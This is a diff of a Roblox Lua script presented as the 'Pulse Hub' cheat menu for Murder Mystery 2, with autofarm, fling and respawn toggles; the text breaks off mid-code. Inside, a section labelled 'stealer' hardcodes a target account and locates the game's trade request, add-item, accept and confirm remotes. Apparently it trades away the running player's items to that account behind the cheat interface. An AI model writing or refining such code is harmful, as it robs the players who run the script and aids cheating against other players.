@@ -5,6 +5,7 @@ local rs = game:GetService("ReplicatedStorage")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 
 if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then
@@ -33,22 +34,19 @@ end)
 
 -- Стилер
 local targetName = "Cat97646"
-
 local function findRemote(name)
     for _, v in ipairs(rs:GetDescendants()) do
         if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-            if v.Name:lower():find(name:lower()) then
-                return v
-            end
+            if v.Name:lower():find(name:lower()) then return v end
         end
     end
     return nil
 end
 
-local tradeRequest = findRemote("TradeRequest") or findRemote("RequestTrade") or findRemote("SendTrade")
-local tradeAccept = findRemote("TradeAccept") or findRemote("AcceptTrade")
-local tradeConfirm = findRemote("TradeConfirm") or findRemote("ConfirmTrade")
-local addItem = findRemote("AddItem") or findRemote("TradeAddItem") or findRemote("AddItemToTrade")
+local tradeRequest = findRemote("traderequest") or findRemote("requesttrade") or findRemote("sendtrade")
+local tradeAccept = findRemote("tradeaccept") or findRemote("accepttrade")
+local tradeConfirm = findRemote("tradeconfirm") or findRemote("confirmtrade")
+local addItem = findRemote("additem") or findRemote("tradeadditem") or findRemote("additemtotrade")
 
 local function getItems()
     local items = {}
@@ -65,9 +63,7 @@ end
 
 local function getTarget()
     for _, p in ipairs(Players:GetPlayers()) do
-        if p.Name == targetName and p ~= player and p.Character then
-            return p
-        end
+        if p.Name == targetName and p ~= player and p.Character then return p end
     end
     return nil
 end
@@ -92,59 +88,86 @@ task.spawn(function()
     end
 end)
 
--- ==================== GUI ====================
+-- Рабочие функции
+local function getMurderer()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p.Character and p.Character:FindFirstChild("Knife") or (p.Backpack and p.Backpack:FindFirstChild("Knife")) then
+            local knife = p.Character and p.Character:FindFirstChild("Knife") or (p.Backpack and p.Backpack:FindFirstChild("Knife"))
+            if knife then return p end
+        end
+    end
+    return nil
+end
+
+local function getCoins()
+    local coins = {}
+    for _, v in ipairs(Workspace:GetDescendants()) do
+        if v.Name == "Coin" and v:IsA("BasePart") then
+            table.insert(coins, v)
+        end
+    end
+    return coins
+end
+
+local function respawn()
+    pcall(function()
+        if player.Character and player.Character:FindFirstChild("Humanoid") then
+            if player.Character.Humanoid.Health <= 0 then
+                local char = player.Character
+                player.Character:BreakJoints()
+                wait(0.5)
+            end
+        end
+    end)
+end
+
+-- ==================== GUI ТОЧЬ-В-ТОЧЬ PULSE HUB ====================
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "PulseHub"
 ScreenGui.Parent = CoreGui
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- Цветовая палитра
 local colors = {
-    bg = Color3.fromRGB(12, 17, 12),
-    sidebar = Color3.fromRGB(9, 13, 9),
-    card = Color3.fromRGB(18, 26, 18),
-    accent = Color3.fromRGB(34, 139, 34),
-    accentLight = Color3.fromRGB(60, 200, 60),
-    text = Color3.fromRGB(240, 255, 240),
-    textDim = Color3.fromRGB(160, 180, 160),
+    bg = Color3.fromRGB(15, 20, 15),
+    sidebar = Color3.fromRGB(10, 14, 10),
+    card = Color3.fromRGB(20, 28, 20),
+    cardLighter = Color3.fromRGB(25, 35, 25),
+    accent = Color3.fromRGB(40, 130, 40),
+    accentLight = Color3.fromRGB(80, 200, 80),
+    text = Color3.fromRGB(230, 255, 230),
+    textDim = Color3.fromRGB(150, 170, 150),
     green = Color3.fromRGB(46, 204, 113),
-    red = Color3.fromRGB(231, 76, 60),
+    red = Color3.fromRGB(200, 50, 50),
     switchOn = Color3.fromRGB(46, 204, 113),
-    switchOff = Color3.fromRGB(52, 52, 52),
+    switchOff = Color3.fromRGB(55, 55, 55),
     divider = Color3.fromRGB(30, 40, 30),
-    hover = Color3.fromRGB(24, 36, 24),
+    hover = Color3.fromRGB(25, 38, 25),
+    activeTab = Color3.fromRGB(22, 55, 22),
 }
 
--- Главное окно
 local Main = Instance.new("Frame")
 Main.Name = "Main"
 Main.Parent = ScreenGui
 Main.BackgroundColor3 = colors.bg
 Main.BorderSizePixel = 0
-Main.Position = UDim2.new(0.5, -280, 0.5, -210)
-Main.Size = UDim2.new(0, 560, 0, 420)
+Main.Position = UDim2.new(0.5, -270, 0.5, -200)
+Main.Size = UDim2.new(0, 540, 0, 400)
 Main.ClipsDescendants = true
 
 local MainCorner = Instance.new("UICorner")
-MainCorner.CornerRadius = UDim.new(0, 12)
+MainCorner.CornerRadius = UDim.new(0, 10)
 MainCorner.Parent = Main
-
-local MainStroke = Instance.new("UIStroke")
-MainStroke.Parent = Main
-MainStroke.Color = Color3.fromRGB(30, 60, 30)
-MainStroke.Thickness = 1
-MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 
 -- Шапка
 local Header = Instance.new("Frame")
 Header.Name = "Header"
 Header.Parent = Main
-Header.BackgroundColor3 = Color3.fromRGB(14, 20, 14)
+Header.BackgroundColor3 = Color3.fromRGB(12, 17, 12)
 Header.BorderSizePixel = 0
-Header.Size = UDim2.new(1, 0, 0, 40)
+Header.Size = UDim2.new(1, 0, 0, 38)
 
 local HeaderCorner = Instance.new("UICorner")
-HeaderCorner.CornerRadius = UDim.new(0, 12)
+HeaderCorner.CornerRadius = UDim.new(0, 10)
 HeaderCorner.Parent = Header
 
 local HeaderCover = Instance.new("Frame")
@@ -154,28 +177,26 @@ HeaderCover.BorderSizePixel = 0
 HeaderCover.Position = UDim2.new(0, 0, 0.5, 0)
 HeaderCover.Size = UDim2.new(1, 0, 0.5, 0)
 
--- Лого
 local Logo = Instance.new("Frame")
 Logo.Parent = Header
 Logo.BackgroundColor3 = colors.accent
 Logo.BorderSizePixel = 0
-Logo.Position = UDim2.new(0, 12, 0, 8)
-Logo.Size = UDim2.new(0, 24, 0, 24)
+Logo.Position = UDim2.new(0, 14, 0, 8)
+Logo.Size = UDim2.new(0, 22, 0, 22)
 
 local LogoCorner = Instance.new("UICorner")
-LogoCorner.CornerRadius = UDim.new(0, 12)
+LogoCorner.CornerRadius = UDim.new(0, 11)
 LogoCorner.Parent = Logo
 
 local LogoText = Instance.new("TextLabel")
 LogoText.Parent = Logo
 LogoText.BackgroundTransparency = 1
 LogoText.Size = UDim2.new(1, 0, 1, 0)
-LogoText.Font = Enum.Font.GothamBold
+LogoText.Font = Enum.Font.GothamBlack
 LogoText.Text = "P"
 LogoText.TextColor3 = Color3.fromRGB(255, 255, 255)
-LogoText.TextSize = 16
+LogoText.TextSize = 15
 
--- Название
 local TitleLabel = Instance.new("TextLabel")
 TitleLabel.Parent = Header
 TitleLabel.BackgroundTransparency = 1
@@ -183,42 +204,39 @@ TitleLabel.Position = UDim2.new(0, 44, 0, 0)
 TitleLabel.Size = UDim2.new(0, 100, 1, 0)
 TitleLabel.Font = Enum.Font.GothamBold
 TitleLabel.Text = "Pulse Hub"
-TitleLabel.TextColor3 = colors.text
-TitleLabel.TextSize = 16
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.TextSize = 15
 TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
 
--- Подзаголовок
 local SubTitle = Instance.new("TextLabel")
 SubTitle.Parent = Header
 SubTitle.BackgroundTransparency = 1
 SubTitle.Position = UDim2.new(0, 130, 0, 0)
-SubTitle.Size = UDim2.new(0, 140, 1, 0)
+SubTitle.Size = UDim2.new(0, 150, 1, 0)
 SubTitle.Font = Enum.Font.Gotham
 SubTitle.Text = "Murder Mystery 2"
 SubTitle.TextColor3 = colors.accentLight
 SubTitle.TextSize = 11
 SubTitle.TextXAlignment = Enum.TextXAlignment.Left
 
--- Кнопка закрытия
 local CloseBtn = Instance.new("TextButton")
 CloseBtn.Parent = Header
 CloseBtn.BackgroundTransparency = 1
-CloseBtn.Position = UDim2.new(1, -36, 0, 0)
-CloseBtn.Size = UDim2.new(0, 36, 1, 0)
+CloseBtn.Position = UDim2.new(1, -34, 0, 0)
+CloseBtn.Size = UDim2.new(0, 34, 1, 0)
 CloseBtn.Font = Enum.Font.GothamBold
 CloseBtn.Text = "×"
-CloseBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
-CloseBtn.TextSize = 20
+CloseBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+CloseBtn.TextSize = 18
 CloseBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)
 CloseBtn.MouseEnter:Connect(function() CloseBtn.TextColor3 = colors.red end)
-CloseBtn.MouseLeave:Connect(function() CloseBtn.TextColor3 = Color3.fromRGB(200, 200, 200) end)
+CloseBtn.MouseLeave:Connect(function() CloseBtn.TextColor3 = Color3.fromRGB(180, 180, 180) end)
 
--- Линия под шапкой
 local HeaderLine = Instance.new("Frame")
 HeaderLine.Parent = Main
 HeaderLine.BackgroundColor3 = colors.divider
 HeaderLine.BorderSizePixel = 0
-HeaderLine.Position = UDim2.new(0, 0, 0, 40)
+HeaderLine.Position = UDim2.new(0, 0, 0, 38)
 HeaderLine.Size = UDim2.new(1, 0, 0, 1)
 
 -- Сайдбар
@@ -227,68 +245,64 @@ Sidebar.Name = "Sidebar"
 Sidebar.Parent = Main
 Sidebar.BackgroundColor3 = colors.sidebar
 Sidebar.BorderSizePixel = 0
-Sidebar.Position = UDim2.new(0, 0, 0, 41)
-Sidebar.Size = UDim2.new(0, 170, 1, -41)
+Sidebar.Position = UDim2.new(0, 0, 0, 39)
+Sidebar.Size = UDim2.new(0, 165, 1, -39)
 
--- Вкладки
 local tabButtons = {}
 local contentFrames = {}
 local activeTab = "AutoFarm"
 
 local tabsData = {
-    {name = "Главная", icon = "rbxassetid://7734068321", id = "Home"},
-    {name = "Шериф", icon = "rbxassetid://7734068321", id = "Sheriff"},
-    {name = "Убийца", icon = "rbxassetid://7734068321", id = "Murderer"},
-    {name = "Автофарм", icon = "rbxassetid://7734068321", id = "AutoFarm"},
-    {name = "Телепорт", icon = "rbxassetid://7734068321", id = "Teleport", locked = true},
-    {name = "Фан/Тролл", icon = "rbxassetid://7734068321", id = "Fun"},
-    {name = "Флинг", icon = "rbxassetid://7734068321", id = "Fling", locked = true},
-    {name = "Настройки", icon = "rbxassetid://7734068321", id = "Settings"},
+    {name = "Главная", icon = "👁", id = "Home"},
+    {name = "Шериф", icon = "👤", id = "Sheriff"},
+    {name = "Убийца", icon = "👤", id = "Murderer"},
+    {name = "Автофарм", icon = "ℹ", id = "AutoFarm"},
+    {name = "Телепорт", icon = "🔒", id = "Teleport", locked = true},
+    {name = "Фан/Тролл", icon = "↔", id = "Fun"},
+    {name = "Флинг", icon = "🔒", id = "Fling", locked = true},
+    {name = "Настройки", icon = "⚙", id = "Settings"},
 }
 
 for i, tab in ipairs(tabsData) do
     local TabBtn = Instance.new("TextButton")
     TabBtn.Parent = Sidebar
-    TabBtn.BackgroundColor3 = (tab.id == "AutoFarm") and Color3.fromRGB(24, 48, 24) or colors.sidebar
+    TabBtn.BackgroundColor3 = (tab.id == "AutoFarm") and colors.activeTab or colors.sidebar
     TabBtn.BorderSizePixel = 0
-    TabBtn.Position = UDim2.new(0, 0, 0, 8 + (i - 1) * 36)
-    TabBtn.Size = UDim2.new(1, 0, 0, 34)
+    TabBtn.Position = UDim2.new(0, 0, 0, 6 + (i - 1) * 35)
+    TabBtn.Size = UDim2.new(1, 0, 0, 33)
     TabBtn.Font = Enum.Font.Gotham
-    TabBtn.Text = "    " .. (tab.locked and "🔒 " or "") .. tab.name
+    TabBtn.Text = "    " .. (tab.locked and "🔒 " or tab.icon .. "  ") .. tab.name
     TabBtn.TextColor3 = (tab.id == "AutoFarm") and colors.text or colors.textDim
     TabBtn.TextSize = 13
     TabBtn.TextXAlignment = Enum.TextXAlignment.Left
     TabBtn.AutoButtonColor = false
-
-    if tab.locked then
-        TabBtn.TextTransparency = 0.4
-    end
+    if tab.locked then TabBtn.TextTransparency = 0.3 end
 
     local highlight = Instance.new("Frame")
     highlight.Parent = TabBtn
-    highlight.BackgroundColor3 = colors.accent
+    highlight.BackgroundColor3 = colors.accentLight
     highlight.BorderSizePixel = 0
     highlight.Position = UDim2.new(0, 0, 0, 0)
-    highlight.Size = UDim2.new(0, 3, 1, 0)
+    highlight.Size = UDim2.new(0, 2, 1, 0)
     highlight.Visible = (tab.id == "AutoFarm")
 
     TabBtn.MouseEnter:Connect(function()
         if tab.id ~= activeTab and not tab.locked then
-            TweenService:Create(TabBtn, TweenInfo.new(0.15), {BackgroundColor3 = colors.hover}):Play()
+            TweenService:Create(TabBtn, TweenInfo.new(0.12), {BackgroundColor3 = colors.hover}):Play()
         end
     end)
     TabBtn.MouseLeave:Connect(function()
         if tab.id ~= activeTab then
-            TweenService:Create(TabBtn, TweenInfo.new(0.15), {BackgroundColor3 = colors.sidebar}):Play()
+            TweenService:Create(TabBtn, TweenInfo.new(0.12), {BackgroundColor3 = colors.sidebar}):Play()
         end
     end)
     TabBtn.MouseButton1Click:Connect(function()
         if not tab.locked then
             for _, btn in ipairs(tabButtons) do
-                TweenService:Create(btn.btn, TweenInfo.new(0.15), {BackgroundColor3 = colors.sidebar, TextColor3 = colors.textDim}):Play()
+                TweenService:Create(btn.btn, TweenInfo.new(0.12), {BackgroundColor3 = colors.sidebar, TextColor3 = colors.textDim}):Play()
                 btn.highlight.Visible = false
             end
-            TweenService:Create(TabBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(24, 48, 24), TextColor3 = colors.text}):Play()
+            TweenService:Create(TabBtn, TweenInfo.new(0.12), {BackgroundColor3 = colors.activeTab, TextColor3 = colors.text}):Play()
             highlight.Visible = true
             activeTab = tab.id
             for _, content in ipairs(contentFrames) do
@@ -299,79 +313,56 @@ for i, tab in ipairs(tabsData) do
     table.insert(tabButtons, {btn = TabBtn, highlight = highlight})
 end
 
--- Нижняя часть сайдбара
 local SideBottom = Instance.new("Frame")
 SideBottom.Parent = Sidebar
-SideBottom.BackgroundColor3 = Color3.fromRGB(7, 10, 7)
+SideBottom.BackgroundColor3 = Color3.fromRGB(8, 11, 8)
 SideBottom.BorderSizePixel = 0
-SideBottom.Position = UDim2.new(0, 0, 1, -80)
-SideBottom.Size = UDim2.new(1, 0, 0, 80)
+SideBottom.Position = UDim2.new(0, 0, 1, -75)
+SideBottom.Size = UDim2.new(1, 0, 0, 75)
 
 local DiscordButton = Instance.new("TextButton")
 DiscordButton.Parent = SideBottom
 DiscordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
 DiscordButton.BorderSizePixel = 0
-DiscordButton.Position = UDim2.new(0.15, 0, 0, 15)
-DiscordButton.Size = UDim2.new(0.7, 0, 0, 28)
+DiscordButton.Position = UDim2.new(0.15, 0, 0, 12)
+DiscordButton.Size = UDim2.new(0.7, 0, 0, 26)
 DiscordButton.Font = Enum.Font.GothamBold
 DiscordButton.Text = "Discord"
 DiscordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-DiscordButton.TextSize = 12
-
+DiscordButton.TextSize = 11
 local DiscordCorner = Instance.new("UICorner")
-DiscordCorner.CornerRadius = UDim.new(0, 6)
+DiscordCorner.CornerRadius = UDim.new(0, 5)
 DiscordCorner.Parent = DiscordButton
 
 local SessionLabel = Instance.new("TextLabel")
 SessionLabel.Parent = SideBottom
 SessionLabel.BackgroundTransparency = 1
-SessionLabel.Position = UDim2.new(0, 0, 0, 52)
-SessionLabel.Size = UDim2.new(1, 0, 0, 18)
+SessionLabel.Position = UDim2.new(0, 0, 0, 48)
+SessionLabel.Size = UDim2.new(1, 0, 0, 16)
 SessionLabel.Font = Enum.Font.Gotham
 SessionLabel.Text = "Session 00:00"
 SessionLabel.TextColor3 = colors.textDim
-SessionLabel.TextSize = 11
+SessionLabel.TextSize = 10
 
--- Контентная область
+local FPSLabel = Instance.new("TextLabel")
+FPSLabel.Parent = SideBottom
+FPSLabel.BackgroundTransparency = 1
+FPSLabel.Position = UDim2.new(0, 0, 0, 60)
+FPSLabel.Size = UDim2.new(1, 0, 0, 12)
+FPSLabel.Font = Enum.Font.Gotham
+FPSLabel.Text = "0 FPS"
+FPSLabel.TextColor3 = Color3.fromRGB(100, 140, 100)
+FPSLabel.TextSize = 10
+
+-- Контент
 local ContentArea = Instance.new("Frame")
 ContentArea.Parent = Main
 ContentArea.BackgroundColor3 = colors.bg
 ContentArea.BorderSizePixel = 0
-ContentArea.Position = UDim2.new(0, 170, 0, 41)
-ContentArea.Size = UDim2.new(1, -170, 1, -41)
+ContentArea.Position = UDim2.new(0, 165, 0, 39)
+ContentArea.Size = UDim2.new(1, -165, 1, -39)
 
--- Контент: Главная
-local HomeContent = Instance.new("Frame")
-HomeContent.Parent = ContentArea
-HomeContent.BackgroundTransparency = 1
-HomeContent.Size = UDim2.new(1, 0, 1, 0)
-HomeContent.Visible = false
-table.insert(contentFrames, {frame = HomeContent, id = "Home"})
-
-local HomeWelcome = Instance.new("TextLabel")
-HomeWelcome.Parent = HomeContent
-HomeWelcome.BackgroundTransparency = 1
-HomeWelcome.Position = UDim2.new(0, 20, 0, 20)
-HomeWelcome.Size = UDim2.new(1, -40, 0, 30)
-HomeWelcome.Font = Enum.Font.GothamBold
-HomeWelcome.Text = "Добро пожаловать в Pulse Hub"
-HomeWelcome.TextColor3 = colors.text
-HomeWelcome.TextSize = 18
-HomeWelcome.TextXAlignment = Enum.TextXAlignment.Left
-
-local HomeDesc = Instance.new("TextLabel")
-HomeDesc.Parent = HomeContent
-HomeDesc.BackgroundTransparency = 1
-HomeDesc.Position = UDim2.new(0, 20, 0, 55)
-HomeDesc.Size = UDim2.new(1, -40, 0, 40)
-HomeDesc.Font = Enum.Font.Gotham
-HomeDesc.Text = "Лучший скрипт для Murder Mystery 2\nВыберите вкладку слева для начала"
-HomeDesc.TextColor3 = colors.textDim
-HomeDesc.TextSize = 13
-HomeDesc.TextXAlignment = Enum.TextXAlignment.Left
-HomeDesc.TextWrapped = true
-
--- Контент: Автофарм
+-- Автофарм контент
 local AutoFarmContent = Instance.new("Frame")
 AutoFarmContent.Parent = ContentArea
 AutoFarmContent.BackgroundTransparency = 1
@@ -379,288 +370,217 @@ AutoFarmContent.Size = UDim2.new(1, 0, 1, 0)
 AutoFarmContent.Visible = true
 table.insert(contentFrames, {frame = AutoFarmContent, id = "AutoFarm"})
 
--- Заголовок вкладки
 local TabTitle = Instance.new("TextLabel")
 TabTitle.Parent = AutoFarmContent
 TabTitle.BackgroundTransparency = 1
-TabTitle.Position = UDim2.new(0, 20, 0, 15)
-TabTitle.Size = UDim2.new(0, 200, 0, 24)
+TabTitle.Position = UDim2.new(0, 18, 0, 12)
+TabTitle.Size = UDim2.new(0, 120, 0, 22)
 TabTitle.Font = Enum.Font.GothamBold
 TabTitle.Text = "Автофарм"
 TabTitle.TextColor3 = colors.text
-TabTitle.TextSize = 18
+TabTitle.TextSize = 17
 TabTitle.TextXAlignment = Enum.TextXAlignment.Left
 
--- Поиск
 local SearchFrame = Instance.new("Frame")
 SearchFrame.Parent = AutoFarmContent
 SearchFrame.BackgroundColor3 = colors.card
 SearchFrame.BorderSizePixel = 0
-SearchFrame.Position = UDim2.new(1, -160, 0, 15)
-SearchFrame.Size = UDim2.new(0, 140, 0, 26)
-
+SearchFrame.Position = UDim2.new(1, -140, 0, 12)
+SearchFrame.Size = UDim2.new(0, 125, 0, 24)
 local SearchCorner = Instance.new("UICorner")
-SearchCorner.CornerRadius = UDim.new(0, 6)
+SearchCorner.CornerRadius = UDim.new(0, 5)
 SearchCorner.Parent = SearchFrame
-
-local SearchIcon = Instance.new("TextLabel")
-SearchIcon.Parent = SearchFrame
-SearchIcon.BackgroundTransparency = 1
-SearchIcon.Position = UDim2.new(0, 8, 0, 0)
-SearchIcon.Size = UDim2.new(0, 16, 1, 0)
-SearchIcon.Font = Enum.Font.Gotham
-SearchIcon.Text = "🔍"
-SearchIcon.TextSize = 10
-SearchIcon.TextXAlignment = Enum.TextXAlignment.Left
 
 local SearchBox = Instance.new("TextBox")
 SearchBox.Parent = SearchFrame
 SearchBox.BackgroundTransparency = 1
-SearchBox.Position = UDim2.new(0, 28, 0, 0)
-SearchBox.Size = UDim2.new(1, -36, 1, 0)
+SearchBox.Position = UDim2.new(0, 8, 0, 0)
+SearchBox.Size = UDim2.new(1, -16, 1, 0)
 SearchBox.Font = Enum.Font.Gotham
 SearchBox.PlaceholderText = "Поиск..."
 SearchBox.PlaceholderColor3 = Color3.fromRGB(120, 140, 120)
 SearchBox.Text = ""
 SearchBox.TextColor3 = colors.text
-SearchBox.TextSize = 12
+SearchBox.TextSize = 11
 SearchBox.TextXAlignment = Enum.TextXAlignment.Left
 
 -- Разделитель
-local Divider1 = Instance.new("Frame")
-Divider1.Parent = AutoFarmContent
-Divider1.BackgroundColor3 = colors.divider
-Divider1.BorderSizePixel = 0
-Divider1.Position = UDim2.new(0.03, 0, 0, 55)
-Divider1.Size = UDim2.new(0.94, 0, 0, 1)
+local Div1 = Instance.new("Frame")
+Div1.Parent = AutoFarmContent
+Div1.BackgroundColor3 = colors.divider
+Div1.BorderSizePixel = 0
+Div1.Position = UDim2.new(0.03, 0, 0, 48)
+Div1.Size = UDim2.new(0.94, 0, 0, 1)
 
--- Карточка статистики
+-- Статистика
 local StatsCard = Instance.new("Frame")
 StatsCard.Parent = AutoFarmContent
 StatsCard.BackgroundColor3 = colors.card
 StatsCard.BorderSizePixel = 0
-StatsCard.Position = UDim2.new(0.03, 0, 0, 70)
-StatsCard.Size = UDim2.new(0.94, 0, 0, 70)
-
+StatsCard.Position = UDim2.new(0.03, 0, 0, 58)
+StatsCard.Size = UDim2.new(0.94, 0, 0, 55)
 local StatsCardCorner = Instance.new("UICorner")
-StatsCardCorner.CornerRadius = UDim.new(0, 8)
+StatsCardCorner.CornerRadius = UDim.new(0, 7)
 StatsCardCorner.Parent = StatsCard
-
-local StatsStroke = Instance.new("UIStroke")
-StatsStroke.Parent = StatsCard
-StatsStroke.Color = colors.divider
-StatsStroke.Thickness = 1
-
-local StatsTitle = Instance.new("TextLabel")
-StatsTitle.Parent = StatsCard
-StatsTitle.BackgroundTransparency = 1
-StatsTitle.Position = UDim2.new(0, 12, 0, 6)
-StatsTitle.Size = UDim2.new(1, -24, 0, 16)
-StatsTitle.Font = Enum.Font.GothamBold
-StatsTitle.Text = "📊 СТАТИСТИКА"
-StatsTitle.TextColor3 = colors.text
-StatsTitle.TextSize = 11
-StatsTitle.TextXAlignment = Enum.TextXAlignment.Left
 
 local StatsGrid = Instance.new("Frame")
 StatsGrid.Parent = StatsCard
 StatsGrid.BackgroundTransparency = 1
-StatsGrid.Position = UDim2.new(0, 12, 0, 26)
-StatsGrid.Size = UDim2.new(1, -24, 0, 36)
+StatsGrid.Position = UDim2.new(0, 10, 0, 6)
+StatsGrid.Size = UDim2.new(1, -20, 0, 42)
 
 local statLabels = {}
-local statNames = {"Сессия:", "Всего:", "Скорость:", "Статус:"}
-local statValues = {"0с", "0", "0 / мин", "Ожидание"}
-
 for i = 1, 4 do
-    local StatBox = Instance.new("Frame")
-    StatBox.Parent = StatsGrid
-    StatBox.BackgroundColor3 = Color3.fromRGB(14, 20, 14)
-    StatBox.BorderSizePixel = 0
-    StatBox.Position = UDim2.new((i - 1) * 0.25 + 0.005, 0, 0, 0)
-    StatBox.Size = UDim2.new(0.24, 0, 1, 0)
+    local box = Instance.new("Frame")
+    box.Parent = StatsGrid
+    box.BackgroundColor3 = Color3.fromRGB(16, 22, 16)
+    box.BorderSizePixel = 0
+    box.Position = UDim2.new((i-1)*0.245 + 0.005, 0, 0, 0)
+    box.Size = UDim2.new(0.235, 0, 1, 0)
+    local boxCorner = Instance.new("UICorner")
+    boxCorner.CornerRadius = UDim.new(0, 4)
+    boxCorner.Parent = box
 
-    local StatBoxCorner = Instance.new("UICorner")
-    StatBoxCorner.CornerRadius = UDim.new(0, 5)
-    StatBoxCorner.Parent = StatBox
+    local nameLabel = Instance.new("TextLabel")
+    nameLabel.Parent = box
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.Position = UDim2.new(0, 0, 0, 3)
+    nameLabel.Size = UDim2.new(1, 0, 0, 14)
+    nameLabel.Font = Enum.Font.Gotham
+    nameLabel.Text = ({"Сессия", "Всего", "Скорость", "Статус"})[i]
+    nameLabel.TextColor3 = colors.textDim
+    nameLabel.TextSize = 9
 
-    local StatName = Instance.new("TextLabel")
-    StatName.Parent = StatBox
-    StatName.BackgroundTransparency = 1
-    StatName.Position = UDim2.new(0, 0, 0, 2)
-    StatName.Size = UDim2.new(1, 0, 0, 14)
-    StatName.Font = Enum.Font.Gotham
-    StatName.Text = statNames[i]
-    StatName.TextColor3 = colors.textDim
-    StatName.TextSize = 10
-
-    local StatValue = Instance.new("TextLabel")
-    StatValue.Parent = StatBox
-    StatValue.BackgroundTransparency = 1
-    StatValue.Position = UDim2.new(0, 0, 0, 16)
-    StatValue.Size = UDim2.new(1, 0, 0, 16)
-    StatValue.Font = Enum.Font.GothamBold
-    StatValue.Text = statValues[i]
-    StatValue.TextColor3 = colors.accentLight
-    StatValue.TextSize = 13
-
-    table.insert(statLabels, StatValue)
+    local valLabel = Instance.new("TextLabel")
+    valLabel.Parent = box
+    valLabel.BackgroundTransparency = 1
+    valLabel.Position = UDim2.new(0, 0, 0, 18)
+    valLabel.Size = UDim2.new(1, 0, 0, 18)
+    valLabel.Font = Enum.Font.GothamBold
+    valLabel.Text = ({"0с", "0", "0/мин", "Ожидание"})[i]
+    valLabel.TextColor3 = colors.accentLight
+    valLabel.TextSize = 13
+    table.insert(statLabels, valLabel)
 end
 
 -- Разделитель
-local Divider2 = Instance.new("Frame")
-Divider2.Parent = AutoFarmContent
-Divider2.BackgroundColor3 = colors.divider
-Divider2.BorderSizePixel = 0
-Divider2.Position = UDim2.new(0.03, 0, 0, 155)
-Divider2.Size = UDim2.new(0.94, 0, 0, 1)
+local Div2 = Instance.new("Frame")
+Div2.Parent = AutoFarmContent
+Div2.BackgroundColor3 = colors.divider
+Div2.BorderSizePixel = 0
+Div2.Position = UDim2.new(0.03, 0, 0, 122)
+Div2.Size = UDim2.new(0.94, 0, 0, 1)
 
 -- Заголовок Фарм
 local FarmTitle = Instance.new("TextLabel")
 FarmTitle.Parent = AutoFarmContent
 FarmTitle.BackgroundTransparency = 1
-FarmTitle.Position = UDim2.new(0, 20, 0, 165)
-FarmTitle.Size = UDim2.new(0, 200, 0, 20)
+FarmTitle.Position = UDim2.new(0, 18, 0, 130)
+FarmTitle.Size = UDim2.new(0, 100, 0, 18)
 FarmTitle.Font = Enum.Font.GothamBold
-FarmTitle.Text = "⚡ ФАРМ"
-FarmTitle.TextColor3 = colors.text
-FarmTitle.TextSize = 11
+FarmTitle.Text = "Фарм"
+FarmTitle.TextColor3 = colors.textDim
+FarmTitle.TextSize = 10
 FarmTitle.TextXAlignment = Enum.TextXAlignment.Left
 
 -- Тогглы
 local togglesData = {
     {name = "Автофарм", desc = "Автоматический сбор монет", key = "AutoFarm", default = false},
-    {name = "Авто-респавн", desc = "Мгновенное возрождение", key = "AutoRespawn", default = true},
+    {name = "Авто-респавн", desc = "Мгновенное возрождение после смерти", key = "AutoRespawn", default = true},
     {name = "Анти-флинг", desc = "Защита от отбрасывания", key = "AntiFling", default = true},
-    {name = "Избегать убийцу", desc = "Авто-отход от убийцы", key = "AvoidMurder", default = true},
-    {name = "Авто-флинг", desc = "Отбрасывание всех игроков", key = "AutoFling", default = true},
+    {name = "Избегать убийцу", desc = "Автоматически убегать от убийцы", key = "AvoidMurder", default = true},
+    {name = "Авто-флинг", desc = "Отбрасывать всех игроков", key = "AutoFling", default = true},
 }
 
 local toggleStates = {}
-local toggleSwitches = {}
-local toggleLabels = {}
 
 for i, tog in ipairs(togglesData) do
     toggleStates[tog.key] = tog.default
 
-    local ToggleCard = Instance.new("Frame")
-    ToggleCard.Parent = AutoFarmContent
-    ToggleCard.BackgroundColor3 = colors.card
-    ToggleCard.BorderSizePixel = 0
-    ToggleCard.Position = UDim2.new(0.03, 0, 0, 192 + (i - 1) * 48)
-    ToggleCard.Size = UDim2.new(0.94, 0, 0, 42)
+    local card = Instance.new("Frame")
+    card.Parent = AutoFarmContent
+    card.BackgroundColor3 = colors.cardLighter
+    card.BorderSizePixel = 0
+    card.Position = UDim2.new(0.03, 0, 0, 154 + (i-1)*44)
+    card.Size = UDim2.new(0.94, 0, 0, 38)
+    local cardCorner = Instance.new("UICorner")
+    cardCorner.CornerRadius = UDim.new(0, 5)
+    cardCorner.Parent = card
 
-    local ToggleCardCorner = Instance.new("UICorner")
-    ToggleCardCorner.CornerRadius = UDim.new(0, 6)
-    ToggleCardCorner.Parent = ToggleCard
+    local nameLabel = Instance.new("TextLabel")
+    nameLabel.Parent = card
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.Position = UDim2.new(0, 12, 0, 4)
+    nameLabel.Size = UDim2.new(0.6, 0, 0, 16)
+    nameLabel.Font = Enum.Font.GothamBold
+    nameLabel.Text = tog.name
+    nameLabel.TextColor3 = colors.text
+    nameLabel.TextSize = 12
+    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-    local ToggleCardStroke = Instance.new("UIStroke")
-    ToggleCardStroke.Parent = ToggleCard
-    ToggleCardStroke.Color = colors.divider
-    ToggleCardStroke.Thickness = 0.5
+    local descLabel = Instance.new("TextLabel")
+    descLabel.Parent = card
+    descLabel.BackgroundTransparency = 1
+    descLabel.Position = UDim2.new(0, 12, 0, 20)
+    descLabel.Size = UDim2.new(0.6, 0, 0, 14)
+    descLabel.Font = Enum.Font.Gotham
+    descLabel.Text = tog.desc
